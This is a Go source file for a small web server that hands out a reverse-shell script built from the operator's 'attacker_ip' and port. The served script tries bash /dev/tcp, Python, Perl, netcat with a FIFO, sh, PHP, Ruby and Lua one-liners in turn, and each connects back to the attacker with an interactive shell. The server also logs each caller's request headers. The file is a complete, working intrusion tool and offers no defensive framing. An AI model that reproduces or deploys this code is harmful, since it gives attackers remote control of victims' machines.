package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

var lhost string
var lport string

func root(w http.ResponseWriter, req *http.Request) {
	fmt.Println("[+] new connection from:", req.RemoteAddr)
	shells := `if command -v bash > /dev/null 2>&1; then
/bin/bash -c "setsid /bin/bash &>/dev/tcp/LHOST/LPORT 0>&1"
	exit;
fi
if command -v python > /dev/null 2>&1; then
	setsid python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("LHOST",LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v python3 > /dev/null 2>&1; then
	setsid python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("LHOST",LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
	exit;
fi

if command -v perl > /dev/null 2>&1; then
	perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	exit;
fi

if command -v nc > /dev/null 2>&1; then
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
	exit;
fi

if command -v sh > /dev/null 2>&1; then
	/bin/sh -i >& /dev/tcp/LHOST/LPORT 0>&1
	exit;
fi

if command -v php > /dev/null 2>&1; then
	php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
	exit;
fi

if command -v ruby > /dev/null 2>&1; then
	ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	exit;
fi

if command -v lua > /dev/null 2>&1; then
	lua -e "require('socket');require('os');t=socket.tcp();t:connect('LHOST','LPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"
	exit;
fi`
	fmt.Println("-------------------------------------------")
	raw := "\t" + req.Method + " " + req.RequestURI + " " + req.Proto
	fmt.Printf("%s\n", raw)
	for h, v := range req.Header {
		fmt.Println("\t" + h + ": " + v[0])
	}
	fmt.Println("-------------------------------------------")
	w.Write([]byte(strings.ReplaceAll(strings.ReplaceAll(shells, "LHOST", lhost), "LPORT", lport)))
}
func main() {
	flag.StringVar(&lhost, "lhost", "", "ip to send shell")
	flag.StringVar(&lport, "lport", "", "port to send shell")
	listen := flag.String("listen", "8000", "port that is used for this web server")
	flag.Parse()
	if lhost == "" || lport == "" {
		fmt.Println("[!] usage", os.Args[0], "-lhost <attacker_ip> -lport <attacker_port> -listen <http_port>")
		flag.PrintDefaults()
		return
	}
	http.HandleFunc("/", root)
	fmt.Println("[*] server started on 0.0.0.0:" + *listen)
	fmt.Println("[*] shells connect to " + lhost + ":" + lport)
	err := http.ListenAndServe("0.0.0.0:"+*listen, nil)
	if err != nil {
		fmt.Println("[!] error starting web server", err)
	}
}
